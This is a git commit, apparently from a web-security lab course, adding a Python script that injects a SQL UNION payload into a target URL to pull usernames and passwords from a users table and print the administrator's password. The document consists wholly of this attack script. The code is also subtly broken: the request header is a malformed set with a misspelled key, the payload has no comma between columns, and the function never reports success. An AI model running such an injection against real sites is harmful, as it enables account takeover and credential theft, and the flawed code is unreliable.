b80f72962125756df3514000e206f070f14392d9
Mahendra Ravichandran <mahiravi36901@gmail.com>
2025-09-03 16:53:29 -0400

    lab 5

---
+++ SQLi/SQLi_retrieve_data_union_other_table/SQLi_retrieve_data_union_other_table.py
@@ -0,0 +1,31 @@
+import sys
+import requests
+import urllib3
+from bs4 import BeautifulSoup
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+proxies={'http':'http://127.0.0.1:8080',
+          'https': 'http://127.0.0.1:8080'}
+header={'usere-agent:Mozilla/5.0'}
+
+def sqli_user_table(url):
+    payload = " 'UNION+SELECT+username+password+from+users-- "
+    r = requests.get(url+payload,headers=header,proxies=proxies)
+    res = r.text
+    if 'administrator' in res:
+        print("Found the administrator password")
+        parse= BeautifulSoup(res,'html.parser')
+        admin_password = parse.body.find(text='administrator').parent.findNext('td').contents[0]
+        print(f"the admin password is {admin_password}")
+    else:
+        return False
+    
+if __name__== "__main__":
+    try:
+        url = sys.argv[1].strip()
+    except IndexError:
+        print("Usage: python script.py <url>")
+        sys.exit(-1)
+    if not sqli_user_table(url):
+        print("The sqli Union attack to retrieve the administrator details is invalid")
+
+
